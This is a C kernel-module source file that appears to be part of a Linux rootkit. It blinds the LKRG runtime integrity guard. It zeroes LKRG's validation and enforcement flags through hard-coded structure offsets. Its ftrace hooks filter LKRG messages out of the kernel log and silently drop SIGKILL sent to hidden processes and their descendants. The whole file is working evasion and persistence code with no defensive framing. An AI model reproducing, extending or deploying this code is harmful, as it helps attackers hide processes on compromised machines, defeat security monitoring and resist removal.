#include "../include/core.h"
#include "../ftrace/ftrace_helper.h"
#include "../include/hidden_pids.h"
#include "../include/lkrg_bypass.h"

static atomic_t hooks_active = ATOMIC_INIT(0);
static atomic_t umh_bypass_active = ATOMIC_INIT(0);
static struct notifier_block module_notifier;

static char lkrg_log_buf[512];
static DEFINE_SPINLOCK(lkrg_log_lock);

static void *p_lkrg_global_ctrl_ptr = NULL;

#define LKRG_CTRL_UMH_VALIDATE_OFFSET  0x30
#define LKRG_CTRL_UMH_ENFORCE_OFFSET   0x34
#define LKRG_CTRL_PINT_VALIDATE_OFFSET 0x08
#define LKRG_CTRL_PINT_ENFORCE_OFFSET  0x0c

static unsigned int saved_umh_validate = 1;
static unsigned int saved_umh_enforce = 1;
static unsigned int saved_pint_validate = 3;
static unsigned int saved_pint_enforce = 1;
static DEFINE_SPINLOCK(lkrg_ctrl_lock);

static notrace bool find_lkrg_ctrl(void)
{
    if (p_lkrg_global_ctrl_ptr)
        return true;
    
    p_lkrg_global_ctrl_ptr = resolve_sym("p_lkrg_global_ctrl");
    return p_lkrg_global_ctrl_ptr != NULL;
}

static notrace void disable_lkrg_umh_protection(void)
{
    unsigned int *umh_validate, *umh_enforce;
    unsigned int *pint_validate, *pint_enforce;
    unsigned long flags;
    
    if (!p_lkrg_global_ctrl_ptr && !find_lkrg_ctrl())
        return;
    
    spin_lock_irqsave(&lkrg_ctrl_lock, flags);
    
    umh_validate = (unsigned int *)((char *)p_lkrg_global_ctrl_ptr + LKRG_CTRL_UMH_VALIDATE_OFFSET);
    umh_enforce = (unsigned int *)((char *)p_lkrg_global_ctrl_ptr + LKRG_CTRL_UMH_ENFORCE_OFFSET);
    pint_validate = (unsigned int *)((char *)p_lkrg_global_ctrl_ptr + LKRG_CTRL_PINT_VALIDATE_OFFSET);
    pint_enforce = (unsigned int *)((char *)p_lkrg_global_ctrl_ptr + LKRG_CTRL_PINT_ENFORCE_OFFSET);
    
    saved_umh_validate = *umh_validate;
    saved_umh_enforce = *umh_enforce;
    saved_pint_validate = *pint_validate;
    saved_pint_enforce = *pint_enforce;
    
    *umh_validate = 0;
    *umh_enforce = 0;
    *pint_validate = 0;
    *pint_enforce = 0;
    
    spin_unlock_irqrestore(&lkrg_ctrl_lock, flags);
}

static notrace void restore_lkrg_umh_protection(void)
{
    unsigned int *umh_validate, *umh_enforce;
    unsigned int *pint_validate, *pint_enforce;
    unsigned long flags;
    
    if (!p_lkrg_global_ctrl_ptr)
        return;
    
    spin_lock_irqsave(&lkrg_ctrl_lock, flags);
    
    umh_validate = (unsigned int *)((char *)p_lkrg_global_ctrl_ptr + LKRG_CTRL_UMH_VALIDATE_OFFSET);
    umh_enforce = (unsigned int *)((char *)p_lkrg_global_ctrl_ptr + LKRG_CTRL_UMH_ENFORCE_OFFSET);
    pint_validate = (unsigned int *)((char *)p_lkrg_global_ctrl_ptr + LKRG_CTRL_PINT_VALIDATE_OFFSET);
    pint_enforce = (unsigned int *)((char *)p_lkrg_global_ctrl_ptr + LKRG_CTRL_PINT_ENFORCE_OFFSET);
    
    *umh_validate = saved_umh_validate;
    *umh_enforce = saved_umh_enforce;
    *pint_validate = saved_pint_validate;
    *pint_enforce = saved_pint_enforce;
    
    spin_unlock_irqrestore(&lkrg_ctrl_lock, flags);
}

static const char *lkrg_symbols[] = {
    "p_lkrg_global_ctrl",
    "p_cmp_creds",
    "p_check_integrity",
    NULL
};

static notrace bool is_lkrg_present(void)
{
    int i, found = 0;
    for (i = 0; lkrg_symbols[i] != NULL; i++) {
        if (resolve_sym(lkrg_symbols[i]) != NULL)
            found++;
    }
    return (found >= 2);
}

static notrace bool is_lineage_hidden(struct task_struct *task)
{
    int depth = 0;
    struct task_struct *parent;
    
    if (!task) task = current;
    if (!task) return false;
    
    while (task && depth < 64) {
        if (is_hidden_pid(task->pid) || is_hidden_pid(task->tgid) ||
            is_child_pid(task->pid) || is_child_pid(task->tgid))
            return true;
        
        parent = task->real_parent;
        if (!parent || parent == task || task->pid <= 1)
            break;
        task = parent;
        depth++;
    }
    return false;
}

static notrace bool should_hide_task(struct task_struct *task)
{
    return task ? is_lineage_hidden(task) : false;
}

static notrace pid_t extract_pid_from_log(const char *msg)
{
    const char *p;
    pid_t pid = 0;
    
    if (!msg) return 0;
    
    p = strstr(msg, "pid ");
    if (!p) p = strstr(msg, "Killing pid ");
    if (!p) return 0;
    
    while (*p && (*p < '0' || *p > '9')) p++;
    while (*p >= '0' && *p <= '9') {
        pid = pid * 10 + (*p - '0');
        p++;
    }
    return pid;
}

static notrace bool should_filter_log(const char *msg)
{
    pid_t pid;
    int i;
    
    if (!msg || !strstr(msg, "LKRG")) return false;
    
    if (atomic_read(&umh_bypass_active) > 0) {
        if (strstr(msg, "UMH") || strstr(msg, "BLOCK") ||
            strstr(msg, "usermodehelper") || strstr(msg, "Blocked"))
            return true;
    }
    
    pid = extract_pid_from_log(msg);
    if (pid > 0) {
        for (i = 0; i < hidden_count && i < MAX_HIDDEN_PIDS; i++)
            if (hidden_pids[i] == pid) return true;
        for (i = 0; i < child_count && i < MAX_CHILD_PIDS; i++)
            if (child_pids[i] == pid) return true;
    }
    
    return false;
}

static asmlinkage int (*orig_vprintk_emit)(int facility, int level,
    const struct dev_printk_info *dev_info, const char *fmt, va_list args) = NULL;

static notrace asmlinkage int hook_vprintk_emit(int facility, int level,
    const struct dev_printk_info *dev_info, const char *fmt, va_list args)
{
    unsigned long flags;
    va_list args_copy;
    bool filter = false;
    int len = 0;
    
    if (!orig_vprintk_emit || !fmt) 
        return orig_vprintk_emit ? orig_vprintk_emit(facility, level, dev_info, fmt, args) : 0;
    
    if (!strstr(fmt, "LKRG") && !strstr(fmt, "lkrg") && !strstr(fmt, "p_lkrg"))
        return orig_vprintk_emit(facility, level, dev_info, fmt, args);
    
    spin_lock_irqsave(&lkrg_log_lock, flags);
    va_copy(args_copy, args);
    len = vsnprintf(lkrg_log_buf, sizeof(lkrg_log_buf) - 1, fmt, args_copy);
    va_end(args_copy);
    lkrg_log_buf[sizeof(lkrg_log_buf) - 1] = '\0';
    filter = should_filter_log(lkrg_log_buf);
    spin_unlock_irqrestore(&lkrg_log_lock, flags);
    
    if (filter) return len;
    return orig_vprintk_emit(facility, level, dev_info, fmt, args);
}

static int (*orig_do_send_sig_info)(int sig, struct kernel_siginfo *info,
    struct task_struct *p, enum pid_type type) = NULL;

static notrace int hook_do_send_sig_info(int sig, struct kernel_siginfo *info,
    struct task_struct *p, enum pid_type type)
{
    if (sig == SIGKILL && p && should_hide_task(p))
        return 0;
    return orig_do_send_sig_info ? orig_do_send_sig_info(sig, info, p, type) : 0;
}

static int (*orig_send_sig_info)(int sig, struct kernel_siginfo *info,
    struct task_struct *p) = NULL;

static notrace int hook_send_sig_info(int sig, struct kernel_siginfo *info,
    struct task_struct *p)
{
    if (sig == SIGKILL && p && should_hide_task(p))
        return 0;
    return orig_send_sig_info ? orig_send_sig_info(sig, info, p) : 0;
}

static int (*orig___send_signal_locked)(int sig, struct kernel_siginfo *info,
    struct task_struct *t, enum pid_type type, bool force) = NULL;

static notrace int hook___send_signal_locked(int sig, struct kernel_siginfo *info,
    struct task_struct *t, enum pid_type type, bool force)
{
    if (sig == SIGKILL && t && should_hide_task(t))
        return 0;
    return orig___send_signal_locked ? 
        orig___send_signal_locked(sig, info, t, type, force) : 0;
}

static void (*orig_force_sig)(int sig) = NULL;

static notrace void hook_force_sig(int sig)
{
    if (sig == SIGKILL && should_hide_task(current))
        return;
    
    if (sig == SIGKILL && atomic_read(&umh_bypass_active) > 0)
        return;
    
    if (orig_force_sig)
        orig_force_sig(sig);
}

static int (*orig_call_usermodehelper_exec_async)(void *data) = NULL;

static notrace int hook_call_usermodehelper_exec_async(void *data)
{
    bool bypass_active = atomic_read(&umh_bypass_active) > 0;
    
    if (bypass_active) {
        disable_lkrg_umh_protection();
        add_hidden_pid(current->pid);
        add_child_pid(current->pid);
    }
    
    return orig_call_usermodehelper_exec_async ?
        orig_call_usermodehelper_exec_async(data) : 0;
}

static int (*orig_call_usermodehelper_exec)(struct subprocess_info *sub_info, int wait) = NULL;

static notrace int hook_call_usermodehelper_exec(struct subprocess_info *sub_info, int wait)
{
    int ret;
    bool bypass_active = atomic_read(&umh_bypass_active) > 0;
    
    if (bypass_active) {
        disable_lkrg_umh_protection();
        add_hidden_pid(current->pid);
    }
    
    ret = orig_call_usermodehelper_exec ? 
        orig_call_usermodehelper_exec(sub_info, wait) : -ENOENT;
    
    if (bypass_active)
        restore_lkrg_umh_protection();
    
    return ret;
}

static struct ftrace_hook lkrg_hooks[] = {
    HOOK("vprintk_emit", hook_vprintk_emit, &orig_vprintk_emit),
    HOOK("do_send_sig_info", hook_do_send_sig_info, &orig_do_send_sig_info),
    HOOK("send_sig_info", hook_send_sig_info, &orig_send_sig_info),
    HOOK("__send_signal_locked", hook___send_signal_locked, &orig___send_signal_locked),
    HOOK("force_sig", hook_force_sig, &orig_force_sig),
    HOOK("call_usermodehelper_exec_async", hook_call_usermodehelper_exec_async, &orig_call_usermodehelper_exec_async),
    HOOK("call_usermodehelper_exec", hook_call_usermodehelper_exec, &orig_call_usermodehelper_exec),
};

static notrace int try_install_hooks(void)
{
    int i, installed = 0;
    
    for (i = 0; i < ARRAY_SIZE(lkrg_hooks); i++) {
        if (lkrg_hooks[i].address)
            continue;
        if (fh_install_hook(&lkrg_hooks[i]) == 0)
            installed++;
    }
    
    if (installed > 0) {
        atomic_set(&hooks_active, 1);
        return 0;
    }
    return -ENOENT;
}

static notrace void remove_hooks(void)
{
    int i;
    for (i = ARRAY_SIZE(lkrg_hooks) - 1; i >= 0; i--) {
        if (lkrg_hooks[i].address)
            fh_remove_hook(&lkrg_hooks[i]);
    }
    atomic_set(&hooks_active, 0);
}

static notrace int module_notify(struct notifier_block *nb, unsigned long action, void *data)
{
    struct module *mod = data;
    
    if (!mod) return NOTIFY_DONE;
    
    if (action == MODULE_STATE_LIVE && strstr(mod->name, "lkrg")) {
        msleep(2000);
        find_lkrg_ctrl();
    }
    return NOTIFY_DONE;
}

notrace void enable_umh_bypass(void)
{
    atomic_inc(&umh_bypass_active);
    
    if (p_lkrg_global_ctrl_ptr || find_lkrg_ctrl())
        disable_lkrg_umh_protection();
}
EXPORT_SYMBOL(enable_umh_bypass);

notrace void disable_umh_bypass(void)
{
    if (atomic_read(&umh_bypass_active) > 0)
        atomic_dec(&umh_bypass_active);
    
    if (atomic_read(&umh_bypass_active) == 0 && p_lkrg_global_ctrl_ptr)
        restore_lkrg_umh_protection();
}
EXPORT_SYMBOL(disable_umh_bypass);

notrace bool is_lkrg_blinded(void)
{
    return atomic_read(&hooks_active) > 0;
}

notrace int lkrg_bypass_init(void)
{
    try_install_hooks();
    
    module_notifier.notifier_call = module_notify;
    register_module_notifier(&module_notifier);
    
    if (is_lkrg_present())
        find_lkrg_ctrl();
    
    return 0;
}

notrace void lkrg_bypass_exit(void)
{
    if (p_lkrg_global_ctrl_ptr && atomic_read(&umh_bypass_active) > 0)
        restore_lkrg_umh_protection();
    
    unregister_module_notifier(&module_notifier);
    remove_hooks();
    atomic_set(&umh_bypass_active, 0);
}